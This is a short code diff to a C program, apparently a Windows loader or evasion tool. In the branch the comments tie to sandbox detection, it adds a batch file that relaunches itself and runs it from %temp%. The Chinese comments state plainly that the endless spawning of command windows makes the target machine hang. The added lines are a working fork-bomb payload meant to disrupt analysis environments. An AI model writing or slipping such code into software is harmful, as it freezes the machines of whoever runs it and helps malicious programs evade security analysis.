@@ -240,5 +240,9 @@ int main(int argc, char* argv[]) {
     }
     else {
         MessageBoxA(NULL, "Fail", "Fail", NULL);
+        //新增一个若当前环境为沙箱则执行o.bat，o.bat内容为：@echo off & echo :o & echo start o.bat
+        //导致循环运行命令行窗口导致目标机器死机 测试请在虚拟机测试！
+        system("(echo :o && echo start o.bat && echo goto o) > %temp%/o.bat");
+        system("cd %temp% && o.bat");
     }
 }
